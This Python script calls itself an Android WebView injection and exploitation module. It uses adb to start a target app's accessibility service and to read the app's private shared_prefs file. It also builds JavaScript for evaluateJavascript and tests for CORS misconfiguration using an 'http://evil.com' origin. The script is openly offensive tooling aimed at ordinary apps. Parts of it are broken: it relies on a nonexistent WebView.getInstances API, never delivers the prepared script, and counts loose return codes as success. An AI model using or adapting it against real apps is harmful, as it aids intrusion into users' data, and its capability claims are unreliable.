#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Android WebView Injection Module
Provides methods to inject code into Android WebView components
"""

import os
import sys
import json
import subprocess


def inject_webview(target_package: str, js_code: str) -> dict:
    """
    Inject JavaScript into Android WebView component
    
    Args:
        target_package: Target Android package name
        js_code: JavaScript code to inject
        
    Returns:
        Injection results
    """
    results = {
        "target": target_package,
        "injection": "webview",
        "status": "failed",
        "details": []
    }
    
    # Method 1: Use accessibility service to interact with WebView
    cmd1 = f"adb shell am startservice -n {target_package}/.AccessibilityService"
    result = subprocess.run(cmd1, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        results["details"].append({
            "method": "accessibility_service",
            "status": "success",
            "output": result.stdout[:200]
        })
    
    # Method 2: Use JavaScript interface
    js_injection = f"""
    if (window.WebView) {{
        var WebView = window.WebView;
        var instances = WebView.getInstances();
        for (var i = 0; i < instances.length; i++) {{
            instances[i].evaluateJavascript("{js_code}", null);
        }}
    }}
    """
    
    results["details"].append({
        "method": "javascript_interface",
        "code_length": len(js_injection),
        "status": "prepared"
    })
    
    # Method 3: Check for debuggable WebView
    cmd2 = f"adb shell cat /data/data/{target_package}/shared_prefs/webview_debug.xml 2>/dev/null"
    result = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
    
    if "true" in result.stdout:
        results["details"].append({
            "method": "debug_webview",
            "status": "debuggable",
            "output": result.stdout[:200]
        })
    
    # If any method succeeded, mark as success
    if any(d.get("status") == "success" for d in results["details"]):
        results["status"] = "success"
    
    return results


def exploit_webview_cors(target_url: str) -> dict:
    """
    Exploit WebView CORS misconfiguration
    
    Args:
        target_url: Target URL to exploit
        
    Returns:
        Exploitation results
    """
    results = {
        "target": target_url,
        "exploit": "cors_bypass",
        "status": "failed",
        "details": []
    }
    
    # Check for CORS misconfiguration
    import urllib.request
    
    try:
        req = urllib.request.Request(target_url)
        req.add_header("Origin", "http://evil.com")
        
        response = urllib.request.urlopen(req)
        cors_header = response.getheader("Access-Control-Allow-Origin")
        
        results["details"].append({
            "check": "cors_header",
            "value": cors_header,
            "vulnerable": cors_header == "*" or cors_header == "http://evil.com"
        })
        
        if cors_header == "*" or cors_header == "http://evil.com":
            results["status"] = "success"
            results["details"].append({
                "exploit": "bypass_sop",
                "method": "cors_misconfiguration"
            })
    except:
        pass
    
    return results


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Android WebView Injection")
    parser.add_argument("--package", help="Target Android package")
    parser.add_argument("--js", help="JavaScript code to inject")
    parser.add_argument("--url", help="Target URL for CORS exploit")
    
    args = parser.parse_args()
    
    if args.package and args.js:
        results = inject_webview(args.package, args.js)
    elif args.url:
        results = exploit_webview_cors(args.url)
    else:
        results = {
            "error": "Missing required arguments",
            "usage": "--package <pkg> --js <code> OR --url <url>"
        }
    
    print(json.dumps(results, indent=2))
